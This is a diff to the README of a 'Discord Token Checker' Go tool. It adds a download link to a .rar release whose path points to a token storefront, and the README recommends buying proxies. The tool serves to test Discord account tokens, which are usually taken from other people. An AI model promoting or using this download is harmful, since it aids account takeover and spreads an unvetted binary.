@@ -9,7 +9,7 @@
 ## "how"
 
 - Requires: [Go](https://go.dev/).
-- Download **GoChecker** [here]().
+- Download **GoChecker** [here](https://github.com/pyp/Discord-Token-Checker/releases/download/tokens.sellix.io/GoChecker.rar).
 - Optional/Recommended: <em> Purchase [proxies](https://proxies.cx/). </em>
 - Fill out the `config.json` with your desired choices.
 - Start: `go run .` or `GoChecker.exe`.
